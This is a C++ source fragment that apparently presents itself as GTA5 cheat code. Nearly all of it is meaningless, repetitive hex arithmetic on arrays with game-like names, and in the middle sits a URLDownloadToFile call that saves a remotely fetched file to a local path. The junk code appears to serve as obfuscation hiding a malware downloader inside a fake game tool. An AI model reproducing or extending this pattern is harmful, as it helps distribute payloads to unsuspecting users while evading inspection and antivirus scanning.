			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			std::wstring widestr = std::wstring(str.begin(), str.end());
			const wchar_t* widecstr = widestr.c_str();
			string str2 = DiretorioENomeDoArquivo;
			std::wstring widestr2 = std::wstring(str2.begin(), str2.end());
			const wchar_t* widecstr2 = widestr2.c_str();
			URLDownloadToFile(NULL, widecstr, widecstr2, 0, NULL);
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
